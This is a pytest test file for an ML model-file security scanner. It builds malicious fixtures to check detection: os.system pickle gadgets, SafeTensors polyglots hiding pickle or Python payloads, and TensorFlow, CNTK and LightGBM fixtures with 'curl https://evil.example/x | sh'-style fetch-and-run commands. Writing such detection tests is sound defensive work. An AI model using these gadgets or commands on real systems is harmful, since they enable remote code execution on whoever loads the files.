"""Core dispatch regressions for content-routed model formats."""

from __future__ import annotations

import base64
import errno
import gzip
import importlib
import io
import json
import os
import pickle
import struct
import subprocess
import sys
import tarfile
import zipfile
import zlib
from collections.abc import Callable, Iterator
from contextlib import contextmanager
from pathlib import Path
from typing import Any, cast

import pytest

from modelaudit import core as core_module
from modelaudit.analysis.unified_context import UnifiedMLContext
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.cache.optimized_config import normalize_material_scan_config
from modelaudit.config import ModelAuditConfig, set_config
from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
from modelaudit.models import ModelAuditResultModel
from modelaudit.rules import Severity
from modelaudit.scanners import (
    archive_dispatch,
    flax_msgpack_scanner,
    jinja2_template_scanner,
    mxnet_scanner,
    safetensors_scanner,
)
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.jax_checkpoint_scanner import JaxCheckpointScanner
from modelaudit.scanners.tf_metagraph_scanner import _MAX_PARSE_BYTES
from modelaudit.scanners.weight_distribution_scanner import WeightDistributionScanner
from modelaudit.scanners.zip_scanner import ZipScanner
from modelaudit.utils.file import detection as file_detection
from modelaudit.utils.file.detection import (
    EXECUTABLE_ZIP_POLYGLOT_FORMAT,
    FLAX_MSGPACK_STRUCTURE_READ_BYTES,
    JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES,
    JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES,
    LLAMAFILE_ROUTE_SCAN_BYTES,
    LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
    PROTOBUF_MODEL_CANDIDATE_FORMAT,
    SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
    TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT,
)
from modelaudit.utils.file.hdf5 import (
    HDF5_MAGIC,
    HDF5_SIGNATURE_SCAN_MAX_BYTES,
    find_hdf5_signature_offset,
    hdf5_metadata_checksum,
)
from modelaudit.utils.helpers import cache_decorator
from modelaudit.utils.helpers.secure_hasher import SecureFileHasher
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
from modelaudit.whitelists import POPULAR_MODELS
from tests.helpers import (
    create_mock_coreml,
    create_mock_gguf,
    create_mock_mxnet_symbol,
    create_mock_onnx,
    create_mock_pytorch_zip,
    prefix_mock_onnx_with_unknown_field,
    prefix_mock_onnx_with_unknown_group,
)

_SYSTEM_GLOBAL_NAMES = ("os.system", "posix.system", "nt.system")


def _mock_weight_distribution_scanner_availability(monkeypatch: pytest.MonkeyPatch) -> None:
    original_loader = core_module._registry.load_scanner_by_id

    def load_scanner_by_id(scanner_id: str) -> type[Any] | None:
        if scanner_id == "weight_distribution":
            return WeightDistributionScanner
        return original_loader(scanner_id)

    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", load_scanner_by_id)
    monkeypatch.setattr(
        WeightDistributionScanner,
        "can_handle",
        classmethod(lambda _cls, _path: True),
    )


def _valid_elf64_header() -> bytes:
    header = bytearray(b"\x00" * 64)
    header[:4] = b"\x7fELF"
    header[4:7] = b"\x02\x01\x01"
    header[16:18] = (2).to_bytes(2, "little")
    header[18:20] = (62).to_bytes(2, "little")
    header[20:24] = (1).to_bytes(4, "little")
    return bytes(header)


def _write_hf_tokenizer_json(path: Path, extra_fields: dict[str, Any] | None = None) -> Path:
    payload: dict[str, Any] = {
        "version": "1.0",
        "added_tokens": [],
        "model": {
            "type": "BPE",
            "vocab": {"hello": 0},
            "merges": [],
        },
    }
    if extra_fields:
        payload.update(extra_fields)
    path.write_text(json.dumps(payload), encoding="utf-8")
    return path


def _write_ordered_hf_tokenizer_json(
    path: Path,
    *,
    late_fields: str = "",
    padding_size: int = 0,
    model_fields: str = '"type":"BPE","vocab":{"hello":0},"merges":[]',
    version_json: str = '"1.0"',
) -> Path:
    padding = f',"padding":"{"x" * padding_size}"' if padding_size else ""
    path.write_text(
        (f'{{"version":{version_json},"added_tokens":[],"model":{{{model_fields}}}{padding}{late_fields}}}'),
        encoding="utf-8",
    )
    return path


def _write_truncated_ordered_hf_tokenizer_json(path: Path, *, padding_size: int) -> Path:
    path.write_text(
        (
            '{"version":"1.0","added_tokens":[],'
            '"model":{"type":"BPE","vocab":{"hello":0},"merges":[]},'
            f'"padding":"{"x" * padding_size}'
        ),
        encoding="utf-8",
    )
    return path


def test_multi_file_directory_scan_shares_one_pickle_source_snapshot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_dir = tmp_path / "modules"
    module_dir.mkdir()
    module_name = "modelaudit_tp_directory_call_graph_target"
    (module_dir / f"{module_name}.py").write_text(
        "import os\n\ndef invoke(command):\n    return os.system(command)\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(module_dir))
    importlib.invalidate_caches()
    dangerous_module = importlib.import_module(module_name)
    dangerous_invoke = dangerous_module.invoke
    model_dir = tmp_path / "models"
    model_dir.mkdir()

    class Payload:
        def __reduce__(self) -> tuple[Any, tuple[str]]:
            return (dangerous_invoke, ("echo cached-directory-scan",))

    for index in range(2):
        (model_dir / f"model-{index}.pkl").write_bytes(pickle.dumps(Payload()))
    scopes_entered = 0
    scopes_exited = 0
    real_snapshot = core_module.shared_source_sensitive_caches

    @contextmanager
    def fake_snapshot() -> Iterator[None]:
        nonlocal scopes_entered, scopes_exited
        scopes_entered += 1
        with real_snapshot():
            try:
                yield
            finally:
                scopes_exited += 1

    monkeypatch.setattr(core_module, "shared_source_sensitive_caches", fake_snapshot)

    result = core_module.scan_model_directory_or_file(str(model_dir), cache_scan_results=False)

    assert result.success is True
    assert result.files_scanned == 2
    assert (scopes_entered, scopes_exited) == (1, 1)
    assert any(issue.rule_code == "DANGEROUS_CALL_GRAPH" for issue in result.issues)


def test_multi_file_directory_scan_refreshes_changed_pickle_source_snapshot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_dir = tmp_path / "modules"
    module_dir.mkdir()
    module_name = "modelaudit_tp_directory_changed_call_graph_target"
    module_path = module_dir / f"{module_name}.py"
    module_path.write_text("def invoke(command):\n    return command\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(module_dir))
    importlib.invalidate_caches()
    safe_module = importlib.import_module(module_name)
    safe_invoke = safe_module.invoke
    model_dir = tmp_path / "models"
    model_dir.mkdir()

    class Payload:
        def __reduce__(self) -> tuple[Any, tuple[str]]:
            return (safe_invoke, ("echo changed-directory-scan",))

    for index in range(2):
        (model_dir / f"model-{index}.pkl").write_bytes(pickle.dumps(Payload()))

    source_rewritten = False

    def rewrite_before_second_scan(message: str, _percentage: float) -> None:
        nonlocal source_rewritten
        if "Scanning file 2/2" not in message or source_rewritten:
            return
        module_path.write_text(
            "import os\n\ndef invoke(command):\n    return os.system(command)\n",
            encoding="utf-8",
        )
        importlib.invalidate_caches()
        source_rewritten = True

    result = core_module.scan_model_directory_or_file(
        str(model_dir),
        cache_scan_results=False,
        progress_callback=rewrite_before_second_scan,
    )

    assert source_rewritten is True
    assert result.success is True
    assert result.files_scanned == 2
    assert any(issue.rule_code == "DANGEROUS_CALL_GRAPH" for issue in result.issues)


def _build_malicious_pickle(*, protocol: int | None = None) -> bytes:
    """Build a tiny pickle payload that exercises nested dangerous-opcode scanning."""
    import os as os_module

    class DangerousPayload:
        """Serializable payload that reduces to a shell command invocation."""

        def __reduce__(self) -> tuple[Any, tuple[str]]:
            """Return a dangerous reducer target for scanner regression coverage."""
            return (os_module.system, ("echo core-dispatch-test",))

    return pickle.dumps(DangerousPayload(), protocol=protocol)


def _build_protocolless_binary_malicious_pickle() -> bytes:
    """Build a binary pickle gadget without the optional PROTO opcode."""
    return b"\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94."


def _build_protocolless_binary_benign_scalar_pickle() -> bytes:
    """Build a harmless binary pickle scalar without the optional PROTO opcode."""
    return b"\x8c\x02os\x94."


def _write_pickle_safetensors_polyglot(path: Path, header_length: int) -> None:
    """Write a valid SafeTensors file whose bytes are also a dangerous pickle."""
    pickle_tail = b"\n0cos\nsystem\n(Vecho modelaudit-polyglot\ntR."
    metadata = json.dumps(
        {
            "tensor": {
                "dtype": "U8",
                "shape": [len(pickle_tail)],
                "data_offsets": [0, len(pickle_tail)],
            }
        },
        separators=(",", ":"),
    ).encode()
    assert len(metadata) <= header_length
    path.write_bytes(
        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + pickle_tail
    )


def _write_safetensors_pickle_tail(
    path: Path,
    header_length: int,
    pickle_tail: bytes,
    *,
    custom_metadata: dict[str, str] | None = None,
) -> None:
    header: dict[str, Any] = {
        "t": {
            "dtype": "U8",
            "shape": [len(pickle_tail)],
            "data_offsets": [0, len(pickle_tail)],
        }
    }
    if custom_metadata is not None:
        header["__metadata__"] = custom_metadata
    metadata = json.dumps(header, separators=(",", ":")).encode()
    assert len(metadata) <= header_length
    path.write_bytes(
        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + pickle_tail
    )


def _write_oversized_pickle_safetensors_polyglot(path: Path, opcode: bytes) -> None:
    """Write a sparse oversized SafeTensors candidate with a skipped pickle operand."""
    operand_length = file_detection.PROTO0_1_MAX_PROBE_BYTES + 4
    operand = b"\x00\x00\x00{" + bytes(operand_length - 4)
    pickle_stream = (
        opcode + struct.pack("<I", operand_length) + operand + b"0" + _build_protocolless_binary_malicious_pickle()
    )
    header_length = struct.unpack("<Q", pickle_stream[:8])[0]
    assert header_length > SAFETENSORS_ROUTING_HEADER_PARSE_BYTES
    with path.open("wb") as handle:
        handle.write(pickle_stream)
        handle.truncate(8 + header_length)


def _write_gzip_safetensors_polyglot(
    path: Path,
    *,
    include_xss: bool = True,
    include_python_payload: bool = True,
    trailing_data: bytes = b"",
) -> None:
    """Write a valid SafeTensors file that is also a valid gzip Python payload."""
    gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00{"'
    header_length = int.from_bytes(gzip_header[:8], "little")
    block_length = 0xA2C2
    blocks: list[bytes] = []
    uncompressed = bytearray()
    for block_index in range(13):
        data = bytearray(b"a" * block_length)
        if block_index == 0:
            data[:3] = b"'''"
        blocks.append(b"\x60" + struct.pack("<H", block_length) + struct.pack("<H", block_length ^ 0xFFFF) + data)
        uncompressed.extend(data)

    final_length = 20_000
    gzip_member_size = len(gzip_header) + sum(len(block) for block in blocks) + 5 + final_length + 8
    file_size = gzip_member_size + len(trailing_data)
    header_end = 8 + header_length
    tensor_data_size = file_size - header_end
    tensor_data_size_bytes = str(tensor_data_size).encode()
    custom_metadata = b',"__metadata__":{"note":"<script>alert(1)</script>"}' if include_xss else b""
    closure = (
        b'":{"dtype":"U8","shape":['
        + tensor_data_size_bytes
        + b'],"data_offsets":[0,'
        + tensor_data_size_bytes
        + b"]}"
        + custom_metadata
        + b"}"
    )
    final_data_start = len(gzip_header) + sum(len(block) for block in blocks) + 5
    closure_start = header_end - len(closure)
    closure_in_final = closure_start - final_data_start
    boundary_in_final = header_end - final_data_start
    assert 0 <= closure_in_final < boundary_in_final < final_length

    final_data = bytearray(b"a" * final_length)
    final_data[closure_in_final:boundary_in_final] = closure
    python_tail = b"'''\nimport os\nos.system('id')\n" if include_python_payload else b"'''\n"
    final_data[boundary_in_final : boundary_in_final + len(python_tail)] = python_tail
    final_data[boundary_in_final + len(python_tail) :] = b" " * (final_length - boundary_in_final - len(python_tail))
    blocks.append(b"\x61" + struct.pack("<H", final_length) + struct.pack("<H", final_length ^ 0xFFFF) + final_data)
    uncompressed.extend(final_data)

    gzip_member = gzip_header + b"".join(blocks)
    gzip_member += struct.pack("<II", zlib.crc32(uncompressed), len(uncompressed) & 0xFFFFFFFF)
    payload = gzip_member + trailing_data
    assert json.loads(payload[8:header_end].decode("utf-8"))
    assert gzip.decompress(gzip_member) == uncompressed
    path.write_bytes(payload)


def _require_tf_protos() -> None:
    if not _has_tf_protos():
        pytest.skip("TensorFlow protobuf stubs unavailable")


def test_tensorflow_protobuf_bootstrap_avoids_shadow_package(tmp_path: Path) -> None:
    shadow_root = tmp_path / "shadow"
    shadow_tensorflow = shadow_root / "tensorflow"
    shadow_google = shadow_root / "google"
    shadow_tensorflow.mkdir(parents=True)
    shadow_google.mkdir()
    tensorflow_sentinel = tmp_path / "shadow_tensorflow_imported.txt"
    google_sentinel = tmp_path / "shadow_google_imported.txt"
    (shadow_tensorflow / "__init__.py").write_text(
        "\n".join(
            [
                "import os",
                "from pathlib import Path",
                "Path(os.environ['SHADOW_TENSORFLOW_SENTINEL']).write_text('imported', encoding='utf-8')",
            ]
        ),
        encoding="utf-8",
    )
    (shadow_google / "__init__.py").write_text(
        "\n".join(
            [
                "import os",
                "from pathlib import Path",
                "Path(os.environ['SHADOW_GOOGLE_SENTINEL']).write_text('imported', encoding='utf-8')",
            ]
        ),
        encoding="utf-8",
    )

    project_root = Path(__file__).resolve().parents[1]
    env = os.environ.copy()
    pythonpath_entries = [str(shadow_root), str(project_root)]
    existing_pythonpath = env.get("PYTHONPATH")
    if existing_pythonpath:
        pythonpath_entries.append(existing_pythonpath)
    env["PYTHONPATH"] = os.pathsep.join(pythonpath_entries)
    env["SHADOW_TENSORFLOW_SENTINEL"] = str(tensorflow_sentinel)
    env["SHADOW_GOOGLE_SENTINEL"] = str(google_sentinel)

    script = """
import importlib
import json
import modelaudit.protos

tensorflow_module = importlib.import_module("tensorflow")
saved_model_cls = modelaudit.protos.get_saved_model_class()
print(json.dumps({
    "available": modelaudit.protos._check_vendored_protos(),
    "using_vendored": modelaudit.protos.is_using_vendored_protos(),
    "tensorflow_file": getattr(tensorflow_module, "__file__", ""),
    "saved_model_class": saved_model_cls.__name__,
}))
"""
    result = subprocess.run(
        [sys.executable, "-c", script],
        cwd=tmp_path,
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )

    assert result.returncode == 0, result.stderr
    assert not tensorflow_sentinel.exists()
    assert not google_sentinel.exists()
    payload = json.loads(result.stdout)
    assert payload["available"] is True
    assert payload["saved_model_class"] == "SavedModel"
    tensorflow_file = Path(payload["tensorflow_file"]).resolve()
    assert not tensorflow_file.is_relative_to(shadow_root)
    if payload["using_vendored"]:
        assert tensorflow_file.is_relative_to(project_root / "modelaudit" / "protos")


@pytest.mark.parametrize(
    ("enable_user_site", "expected_trusted"),
    [
        pytest.param(False, False, id="disabled"),
        pytest.param(None, False, id="security-disabled"),
        pytest.param(True, True, id="enabled"),
    ],
)
def test_tensorflow_trusted_root_honors_user_site_enablement(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    enable_user_site: bool | None,
    expected_trusted: bool,
) -> None:
    import modelaudit.protos

    user_site = tmp_path / "user-site"
    shadow_tensorflow = user_site / "tensorflow"
    shadow_tensorflow.mkdir(parents=True)
    (shadow_tensorflow / "__init__.py").write_text("", encoding="utf-8")

    monkeypatch.setattr(modelaudit.protos.sysconfig, "get_paths", lambda: {})
    monkeypatch.setattr(modelaudit.protos.site, "getsitepackages", lambda: [])
    monkeypatch.setattr(modelaudit.protos.site, "getusersitepackages", lambda: str(user_site))
    monkeypatch.setattr(modelaudit.protos.site, "ENABLE_USER_SITE", enable_user_site)

    trusted_root = modelaudit.protos._trusted_tensorflow_root()

    if expected_trusted:
        assert trusted_root == user_site.resolve()
    else:
        assert trusted_root is None


def _build_malicious_tf_metagraph() -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    metagraph = meta_graph_pb2.MetaGraphDef()
    metagraph.meta_info_def.meta_graph_version = "modelaudit_route_test"
    node = metagraph.graph_def.node.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
    return cast(bytes, metagraph.SerializeToString())


def _build_malicious_tf_savedmodel() -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
    saved_model = saved_model_pb2.SavedModel()
    saved_model.saved_model_schema_version = 1
    metagraph = saved_model.meta_graphs.add()
    node = metagraph.graph_def.node.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    return cast(bytes, saved_model.SerializeToString())


def _build_collection_only_tf_savedmodel(
    *,
    key: str = "runtime_hook",
    value: bytes = b"curl https://evil.example/x | sh",
) -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
    saved_model = saved_model_pb2.SavedModel()
    saved_model.saved_model_schema_version = 1
    metagraph = saved_model.meta_graphs.add()
    metagraph.collection_def[key].bytes_list.value.append(value)
    return cast(bytes, saved_model.SerializeToString())


def _build_collection_only_tf_metagraph(
    *,
    key: str = "runtime_hook",
    value: bytes = b"curl https://evil.example/x | sh",
) -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    metagraph = meta_graph_pb2.MetaGraphDef()
    metagraph.collection_def[key].bytes_list.value.append(value)
    return cast(bytes, metagraph.SerializeToString())


def _build_malicious_tf_function_metagraph() -> bytes:
    _require_tf_protos()
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    metagraph = meta_graph_pb2.MetaGraphDef()
    function = metagraph.graph_def.library.function.add()
    function.signature.name = "danger"
    node = function.node_def.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
    return cast(bytes, metagraph.SerializeToString())


def _build_malicious_skops_schema() -> bytes:
    """Build a Skops schema that exercises CVE-2025-54412 detection."""
    return json.dumps(
        {
            "__loader__": "OperatorFuncNode",
            "__module__": "builtins",
            "__class__": "eval",
            "_skops_version": "0.11.0",
            "content": {},
        }
    ).encode("utf-8")


def _write_sparse_oversized_safetensors_candidate(
    path: Path,
    header_len: int = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1,
) -> None:
    with path.open("wb") as handle:
        handle.write(struct.pack("<Q", header_len))
        handle.write(b"{")
        handle.truncate(8 + header_len + 1)


def _write_tensorflow_overlap_safetensors_candidate(path: Path, header_prefix: bytes) -> None:
    header_len = 0x212
    header = header_prefix + (b" " * (header_len - len(header_prefix)))
    path.write_bytes(struct.pack("<Q", header_len) + header + b"\x00")


def _write_minimal_safetensors(path: Path) -> None:
    header = {"weights": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    path.write_bytes(struct.pack("<Q", len(header_bytes)) + header_bytes + b"\x00\x00\x00\x00")


def _write_safe_tensorrt(path: Path) -> None:
    path.write_bytes(b"TensorRT safe engine metadata")


def _write_minimal_numpy(path: Path) -> None:
    header = "{'descr': '<f4', 'fortran_order': False, 'shape': (1,), }"
    header_bytes = header.encode("latin1")
    padding = b" " * ((16 - ((10 + len(header_bytes) + 1) % 16)) % 16)
    payload = b"\x93NUMPY\x01\x00" + struct.pack("<H", len(header_bytes) + len(padding) + 1)
    path.write_bytes(payload + header_bytes + padding + b"\n" + struct.pack("<f", 1.0))


def _write_safe_npz(path: Path) -> None:
    header = "{'descr': '<f4', 'fortran_order': False, 'shape': (1,), }"
    header_bytes = header.encode("latin1")
    padding = b" " * ((16 - ((10 + len(header_bytes) + 1) % 16)) % 16)
    payload = b"\x93NUMPY\x01\x00" + struct.pack("<H", len(header_bytes) + len(padding) + 1)
    array_bytes = payload + header_bytes + padding + b"\n" + struct.pack("<f", 1.0)
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("weights.npy", array_bytes)


def _write_safe_paddle(path: Path) -> None:
    path.write_bytes(b"safe paddle model metadata")


def _write_safe_pytorch_binary(path: Path) -> None:
    path.write_bytes(b"benign binary tensor weights" * 10)


def _write_safe_savedmodel(path: Path) -> None:
    path.write_bytes(_build_collection_only_tf_savedmodel(value=b"documentation: https://example.invalid/runtime"))


def _write_safe_r_serialized(path: Path) -> None:
    path.write_bytes(b"X\nsafe\nmodel\nweights")


def _create_misnamed_zip(path: Path, entries: dict[str, bytes]) -> None:
    """Write a ZIP archive at an intentionally misleading file path."""
    with zipfile.ZipFile(path, "w") as archive:
        for name, data in entries.items():
            archive.writestr(name, data)


def _promote_small_zip_to_zip64(path: Path) -> None:
    """Rewrite a small fixture with ZIP64 EOCD metadata while preserving its entries."""
    archive_bytes = bytearray(path.read_bytes())
    eocd_offset = archive_bytes.rfind(b"PK\x05\x06")
    assert eocd_offset >= 0
    entry_count = struct.unpack_from("<H", archive_bytes, eocd_offset + 10)[0]
    directory_size = struct.unpack_from("<I", archive_bytes, eocd_offset + 12)[0]
    directory_offset = struct.unpack_from("<I", archive_bytes, eocd_offset + 16)[0]

    zip64_eocd = struct.pack(
        "<4sQ2H2I4Q",
        b"PK\x06\x06",
        44,
        45,
        45,
        0,
        0,
        entry_count,
        entry_count,
        directory_size,
        directory_offset,
    )
    zip64_locator = struct.pack("<4sIQI", b"PK\x06\x07", 0, eocd_offset, 1)
    archive_bytes[eocd_offset + 8 : eocd_offset + 12] = b"\xff" * 4
    archive_bytes[eocd_offset + 12 : eocd_offset + 20] = b"\xff" * 8
    path.write_bytes(archive_bytes[:eocd_offset] + zip64_eocd + zip64_locator + archive_bytes[eocd_offset:])


def _append_hdf5_userblock_candidate(
    path: Path,
    *,
    plausible: bool,
    minimum_signature_offset: int = 512,
) -> int:
    """Append an HDF5 signature candidate after a complete ZIP user block."""
    payload = bytearray(path.read_bytes())
    signature_offset = minimum_signature_offset
    while signature_offset < len(payload):
        signature_offset *= 2

    minimum_size = signature_offset + 64
    payload.extend(bytes(minimum_size - len(payload)))
    if plausible:
        superblock = bytearray(HDF5_MAGIC + b"\x03\x08\x08\x00")
        superblock.extend(signature_offset.to_bytes(8, "little"))
        superblock.extend(b"\xff" * 8)
        superblock.extend(len(payload).to_bytes(8, "little"))
        superblock.extend((signature_offset + 48).to_bytes(8, "little"))
        superblock.extend(hdf5_metadata_checksum(bytes(superblock)).to_bytes(4, "little"))
    else:
        superblock = bytearray(HDF5_MAGIC + b"\x03\x01\x01\x00")
    payload[signature_offset : signature_offset + len(superblock)] = superblock
    path.write_bytes(payload)
    return signature_offset


def _write_safetensors_hdf5_userblock_candidate(path: Path, *, plausible: bool) -> int:
    """Write a SafeTensors payload whose tensor bytes contain an HDF5 candidate."""
    signature_offset = 512
    file_size = signature_offset + 64
    header_size = signature_offset - 8
    header = {
        "weights": {
            "dtype": "U8",
            "shape": [file_size - signature_offset],
            "data_offsets": [0, file_size - signature_offset],
        }
    }
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    payload = bytearray(struct.pack("<Q", header_size) + header_bytes.ljust(header_size, b" ") + bytes(64))

    if plausible:
        superblock = bytearray(HDF5_MAGIC + b"\x03\x08\x08\x00")
        superblock.extend(signature_offset.to_bytes(8, "little"))
        superblock.extend(b"\xff" * 8)
        superblock.extend(file_size.to_bytes(8, "little"))
        superblock.extend((signature_offset + 48).to_bytes(8, "little"))
        superblock.extend(hdf5_metadata_checksum(bytes(superblock)).to_bytes(4, "little"))
    else:
        superblock = bytearray(HDF5_MAGIC + b"\x03\x01\x01\x00")
    payload[signature_offset : signature_offset + len(superblock)] = superblock
    path.write_bytes(payload)
    return signature_offset


@pytest.mark.parametrize(
    ("payload", "expected"),
    [
        (bytes((23,)), 0xA209C931),
        (bytes(1), 0x8BA9414B),
        (bytes((23, 187, 98)), 0xCEBDF4F0),
        (bytes(3), 0x6BD0060F),
    ],
)
def test_hdf5_metadata_checksum_matches_reference_vectors(payload: bytes, expected: int) -> None:
    assert hdf5_metadata_checksum(payload) == expected


def test_hdf5_signature_probe_rejects_corrupted_v2_checksum(tmp_path: Path) -> None:
    polyglot = tmp_path / "corrupted-checksum.zip"
    _create_misnamed_zip(polyglot, {"README.txt": b"benign archive"})
    signature_offset = _append_hdf5_userblock_candidate(polyglot, plausible=True)
    payload = bytearray(polyglot.read_bytes())
    payload[signature_offset + 44] ^= 1
    polyglot.write_bytes(payload)

    assert find_hdf5_signature_offset(str(polyglot)) is None


def _write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    structure = b" CompositeFunction primitive_functions " if include_structure else b""
    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
    path.write_bytes(prefix + structure + payload)


def _write_delayed_flax_cntk_overlap(path: Path) -> None:
    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    structure = b" CompositeFunction primitive_functions "
    delayed_flax_root = flax_msgpack_scanner.msgpack.packb(
        {"params": {"w": [1, 2, 3]}, "__reduce__": "attacker_callable"},
        use_bin_type=True,
    )
    path.write_bytes(prefix + structure + (b"\xc0" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 1)) + delayed_flax_root)


def _write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
    body = "tree=0\nversion=v4\nnum_class=1\n"
    if valid:
        body += (
            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
            "split_feature=0\nleaf_value=0.1 0.2\n"
            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
            "callback_url=https://collector.evil.example/payload.sh\n"
        )
    path.write_text(body, encoding="utf-8")


def _create_zip_with_ordered_entries(path: Path, entries: list[tuple[str, bytes]]) -> None:
    """Write a ZIP archive with duplicate entries in caller-defined order."""
    with zipfile.ZipFile(path, "w") as archive:
        for name, data in entries:
            archive.writestr(name, data)


def _prepend_stub(path: Path, stub: bytes) -> None:
    """Prefix an existing ZIP with reader-tolerated self-extracting stub bytes."""
    path.write_bytes(stub + path.read_bytes())


def _mark_zip_entries_encrypted(path: Path) -> None:
    """Set the ZIP encryption flag on all entries without changing payload bytes."""
    archive_bytes = bytearray(path.read_bytes())
    for signature, flag_offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        offset = 0
        while True:
            offset = archive_bytes.find(signature, offset)
            if offset < 0:
                break
            flags = int.from_bytes(archive_bytes[offset + flag_offset : offset + flag_offset + 2], "little")
            archive_bytes[offset + flag_offset : offset + flag_offset + 2] = (flags | 0x1).to_bytes(2, "little")
            offset += len(signature)
    path.write_bytes(archive_bytes)


def _assert_system_pickle_detected(result: ScanResult, entry_name: str) -> None:
    """Assert a nested pickle finding points at the expected ZIP entry."""
    assert any(
        issue.rule_code == "S201"
        and issue.details.get("zip_entry") == entry_name
        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    ), f"Expected S201 finding for {entry_name}, got: {[(i.location, i.message, i.details) for i in result.issues]}"


def _assert_system_pickle_issue(result: ScanResult) -> None:
    """Assert a pickle finding identifies the dangerous system global."""
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    ), f"Expected S201 system finding, got: {[(i.location, i.message, i.details) for i in result.issues]}"


def _mock_sharded_scan_result(bytes_scanned: int, *, missing_shards: int = 0) -> ScanResult:
    """Return a ScanResult shaped like the advanced sharded-model handler."""
    result = ScanResult(scanner_name="safetensors")
    result.bytes_scanned = bytes_scanned
    result.add_check(
        name="Mock Shard Scan",
        passed=True,
        message="Mock shard family scanned",
        severity=IssueSeverity.INFO,
    )
    if missing_shards:
        result.add_check(
            name="Sharded Model Coverage Check",
            passed=False,
            message=f"Missing {missing_shards} expected model shard(s); scan coverage is incomplete.",
            severity=IssueSeverity.INFO,
            details={
                "expected_total_shards": 3,
                "present_total_shards": 2,
                "missing_shard_count": missing_shards,
                "analysis_incomplete": True,
                "scan_outcome": "inconclusive",
                "scan_outcome_reason": "missing_model_shards",
            },
        )
        result.metadata["analysis_incomplete"] = True
        result.metadata["scan_outcome"] = "inconclusive"
        result.metadata["scan_outcome_reasons"] = ["missing_model_shards"]
    result.finish(success=missing_shards == 0)
    return result


def test_directory_scan_scans_sharded_model_family_once(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 4):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00003.safetensors"
        shard_path.write_bytes(f"shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    family_size = sum(shard.stat().st_size for shard in shards)
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(family_size)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    assert len(calls) == 1
    assert Path(calls[0]).name in {shard.name for shard in shards}
    assert result.files_scanned == len(shards)
    assert result.bytes_scanned == family_size
    assert set(result.file_metadata) == {str(shard) for shard in shards}
    assert {asset.path for asset in result.assets} == {str(shard) for shard in shards}


def test_directory_scan_preserves_per_shard_sizes(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index, payload in enumerate((b"a", b"second-shard", b"third-shard-is-longer"), start=1):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00003.safetensors"
